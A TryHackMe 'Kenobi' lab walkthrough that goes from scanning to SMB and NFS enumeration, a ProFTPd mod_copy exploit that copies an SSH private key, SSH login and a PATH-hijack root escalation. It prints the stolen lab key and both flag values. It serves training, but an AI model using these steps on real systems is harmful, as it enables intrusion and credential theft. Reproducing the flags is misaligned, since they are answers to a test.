#   Tryhackme- Kenobi
##  IP - 10.10.198.139
```bash
export IP=10.10.198.139
```

```
Walkthrough by-
Shaswata Saha
29th June 2023
12:00PM
```

##  Steps
1.  Nmap Scan:
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 05:22 EDT
Nmap scan report for 10.10.198.139
Host is up (0.21s latency).
Not shown: 993 closed tcp ports (conn-refused)
PORT     STATE SERVICE
#21/tcp   open  ftp
#22/tcp   open  ssh
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
#80/tcp   open  http
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry 
|_/admin.html
#111/tcp  open  rpcbind
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38183/tcp6  mountd
|   100005  1,2,3      41773/tcp   mountd
|   100005  1,2,3      45133/udp   mountd
|   100005  1,2,3      60095/udp6  mountd
|   100021  1,3,4      40831/tcp   nlockmgr
|   100021  1,3,4      45065/tcp6  nlockmgr
|   100021  1,3,4      49319/udp6  nlockmgr
|   100021  1,3,4      59005/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
#139/tcp  open  netbios-ssn
#445/tcp  open  microsoft-ds
#2049/tcp open  nfs_acl

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h40m03s, deviation: 2h53m12s, median: 3s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2023-06-29T04:23:03-05:00
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2023-06-29T09:23:03
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

```
Therefore 7 ports are open.

2.  Gobuster Scan:
```bash
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.198.139
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/06/29 05:23:08 Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 36]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswds           (Status: 403) [Size: 278]
Progress: 1822 / 1829 (99.62%)
===============================================================
2023/06/29 05:23:54 Finished
===============================================================

```

3.  Using the nmap with script for _Samba_:
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.198.139
```
Result:
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 05:29 EDT
Nmap scan report for 10.10.198.139
Host is up (0.31s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.198.139\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 2
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.198.139\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.198.139\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 33.37 seconds

```
### IP Change export IP=10.10.29.95

1.  Mount:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Kenobi]
└─$ showmount -e 10.10.29.95
Export list for 10.10.29.95:
/var *
```

2.  Finding veersion of Proftpd:
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Kenobi]
└─$ searchsploit proftpd 1.3.5

----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)  | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution        | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)    | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                  | linux/remote/36742.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                           
```
Found the version!

3.  We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Kenobi]
└─$ nc $IP 21 
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.29.95]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name                                     
SITE CPTO /var/tmp/id_rsa                                                                    
250 Copy successful

```

4.  Created a folder named mount/kenobi_mount/ and mounted the file structure from the IP to this folder.
```bash
──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Kenobi/mnt]
└─$ sudo mount 10.10.29.95:/var kenobi_mount 
                                                                                             
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Kenobi/mnt]
└─$ tree
.
cd ken  └── kenobi_mount
    ├── backups
    │   └── apt.extended_states.0
^C

┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Kenobi/mnt]
└─$ cd kenobi_mount 
                                                                                             
┌──(subhro1530㉿subhro)-[~/…/tryhackme/Kenobi/mnt/kenobi_mount]
└─$ ls
backups  cache  crash  lib  local  lock  log  mail  opt  run  snap  spool  tmp  www
                                                                                             
┌──(subhro1530㉿subhro)-[~/…/tryhackme/Kenobi/mnt/kenobi_mount]
└─$ cd tmp            
                                                                                             
┌──(subhro1530㉿subhro)-[~/…/Kenobi/mnt/kenobi_mount/tmp]
└─$ ls
id_rsa
systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
systemd-private-fec0499b29de4b93a899fced475b5aeb-systemd-timesyncd.service-hDkjxs


```
We got thr id_rsa!

5.  id_rsa
```bash
-----BEGIN RSA PRIVATE KEY-----MIIEowIBAAKCAQEA4PeD0e0522UEj7xlrLmN68R6iSG3HMK/aTI812CTtzM9gnXsqpweZL+GJBB59bSG3RTPtirC3M9YNTDsuTvxw9Y/+NuUGJIq5laQZS5e2RaqI1nvU7fXEQlJrrlWfCy9VDTlgB/KRxKerqc42aU+/BrSyYqImpN6AgoNm/s/753DEPJtdwsr45KFJOhtaIPA4EoZAq8pKovdSFteeUHikosUQzgqvSCv1RH8ZYBTwslxSorWy3fXs5GwjitvRnQEVTO/GZomGV8UhjrT3TKbPhiwOy5YA484Lp3ES0uxKJEnKdStotHFT4i1hXq6T0CvYoaEpL7zCq7udl7KcZ0zfwIDAQABAoIBAEDl5nc28kviVnCIruQnG1P6eEb7HPIFFGbqgTa4u6RL+eCa2E1XgEUcIzxgLG6/R3CbwlgQ+entPssJdCDztAkE06uc3JpCAHI2Yq1ttRr3ONm95hbGoBpgDYuEF/j2hx+1qsdNZHMgYfqMbxAKZaMgsdJGTqYZCUdxUv++eXFMDTTw/h2SCAuPE2Nb1f1537w/UQbB5HwZfVrytRHknh1hfcjh4ZD5x5Bta/THjjsZo1kb/UuX41TKDFE/6+Eq+G9AvWNC2LJ6My36YfeRs89A1Pc2XD08LoglPxzR7Hox36VOGD+95STWsBViMlk2lJ5IzU9XVIt3EnClbUI7DNECgYEA8ZymxvRV7yvDHHLjw5Vj/puVIQnKtadmE9H9UtfGV8gI/NddE66et8uIhiydcxE/u8DZd+mPt1RMU9GeUT5WxZ8MpO0UPVPIRiSBHnyu+0tolZSLqVulrwT/nMDCJGQNaSOb2kq+Y3DJBHhlOeTsxAi2YEwrK9hPFQ5btlQichMCgYEA7l0cdd1mwrjZ51lWWXvQzOH0PZH/diqXiTgwD6F1sUYPAc4qZ79blloeIhrVIj+isvtqmgG2GD0TWueNnddGafwIp3USIxZOcw+e5hHmxy0KHpqstbPZc99IUQ5UBQHZYCvlSR+ANdNuWpRTD6gWeVqNVni9wXjKhiKM17p3RmUCgYEAp6dwAvZg+wl+5irC6WCsdmw3WymUQ+DY8D/ybJ3Vv+vKcMhwicvNzvOo1JH433PEqd/0B0VGuIwCOtdl6DI9uvVpkvsk3Gjsyh5gFI8iZuWAtWE5Av4OC5bwMXw8ZeLxr0y1JKw8ge9NSDl/PphYNY61y+DdXUvywifkzFmhYkCgYB6TeZbh9XBVg3gyhMnaQNzDQFAUlhM7n/Alcb7TjJQWo06tOlHQIWi+Ox7PV9c6l/2DFDfYr9nYnc67pLYiWwE16AtJEHBJSHtofc7P7Y1PqPxnhW+SeDqtoepp3tu8kryMLO+OF6Vv73g1jhkUS/u5oqc8ukSi4MHHlU8H94xjQKBgExhzreYXCjK9FswXhUU9avijJkoAsSbIybRzq1YnX0gSewY/SB2xPjFS40wzYviRHr/h0TOOzXzX8VMAQx5XnhZ5C/WMhb0cMErK8z+jvDavEpkMUlR+dWfPy/CLlDCU4e+49XBAPKEmY4DuN+J2Em/tCz7dzfCNS/mpsSEn0jo-----END RSA PRIVATE KEY-----

```
6.  Making it rw------ using
```bash
chmod 600 id_rsa
```

7.  Getting the user.txt file content
```bash
┌──(subhro1530㉿subhro)-[~/Desktop/tryhackme/Kenobi]
└─$ ssh kenobi@10.10.29.95 -i id_rsa
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ cat user.txt 
d0b0f3f53b6caa532a83915e19224899
kenobi@kenobi:~$ 
```

##  Privelege escalation
1.  Path manipulation:
```bash
kenobi@kenobi:~$ echo $PATH
/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
kenobi@kenobi:~$ ls
share  user.txt
kenobi@kenobi:~$ echo "/bin/sh" > /tmp/curl
kenobi@kenobi:~$ 

```

2.  Getting root.txt file
```bash

kenobi@kenobi:/tmp$ ls -al
total 36
drwxrwxrwt  8 root   root   4096 Jun 29 08:42 .
drwxr-xr-x 23 root   root   4096 Sep  4  2019 ..
-rw-rw-r--  1 kenobi kenobi    8 Jun 29 08:42 curl
drwxrwxrwt  2 root   root   4096 Jun 29 06:36 .font-unix
drwxrwxrwt  2 root   root   4096 Jun 29 06:36 .ICE-unix
drwx------  3 root   root   4096 Jun 29 06:36 systemd-private-fec0499b29de4b93a899fced475b5aeb-systemd-timesyncd.service-TudOJa
drwxrwxrwt  2 root   root   4096 Jun 29 06:36 .Test-unix
drwxrwxrwt  2 root   root   4096 Jun 29 06:36 .X11-unix
drwxrwxrwt  2 root   root   4096 Jun 29 06:36 .XIM-unix
kenobi@kenobi:/tmp$ chmod 777 curl 
#   Giving all permissions to curl file
kenobi@kenobi:/tmp$ ls -al
total 36
drwxrwxrwt  8 root   root   4096 Jun 29 08:42 .
drwxr-xr-x 23 root   root   4096 Sep  4  2019 ..
-rwxrwxrwx  1 kenobi kenobi    8 Jun 29 08:42 curl
drwxrwxrwt  2 root   root   4096 Jun 29 06:36 .font-unix
drwxrwxrwt  2 root   root   4096 Jun 29 06:36 .ICE-unix
drwx------  3 root   root   4096 Jun 29 06:36 systemd-private-fec0499b29de4b93a899fced475b5aeb-systemd-timesyncd.service-TudOJa
drwxrwxrwt  2 root   root   4096 Jun 29 06:36 .Test-unix
drwxrwxrwt  2 root   root   4096 Jun 29 06:36 .X11-unix
drwxrwxrwt  2 root   root   4096 Jun 29 06:36 .XIM-unix
kenobi@kenobi:/tmp$ cd
kenobi@kenobi:~$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
1
# ls
share  user.txt
# cd /root
# ls
root.txt
# cat root.txt
177b3cd8562289f37382721c28381f02
```
We got the contents!